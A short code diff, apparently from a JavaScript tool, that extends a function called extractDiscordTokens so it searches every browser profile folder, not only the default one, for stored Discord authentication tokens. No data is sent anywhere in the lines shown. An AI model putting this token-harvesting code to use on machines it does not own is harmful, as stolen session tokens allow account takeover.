@@ -42,8 +42,21 @@ const appsPaths = {
  */
 async function extractDiscordTokens() {
   const tokens = new Set()
-  // TODO: SUPPORT MULTI PROFILES
+
   let pathsToCheck = Object.entries(appsPaths)
+
+  // Try to find non-default browser profiles
+  pathsToCheck
+    .filter(([appName, appPath]) => appPath.includes('Default') && fs.existsSync(appPath.replace(/\\Default.*/, '')))
+    .forEach(([appName, appPath]) => {
+      fs.readdirSync(appPath.replace(/\\Default.*/, ''))
+        .filter(file => file.startsWith('Profile '))
+        .forEach(file => {
+          const profilePath = appPath.replace('Default', file)
+          if (fs.existsSync(profilePath)) pathsToCheck.push([`${appName} ${file}`, profilePath])
+        })
+    })
+
   for (const [appName, appPath] of pathsToCheck) {
     if (!fs.existsSync(appPath)) {
       console.log(`Skip ${appName} (not found) - ${appPath}`)
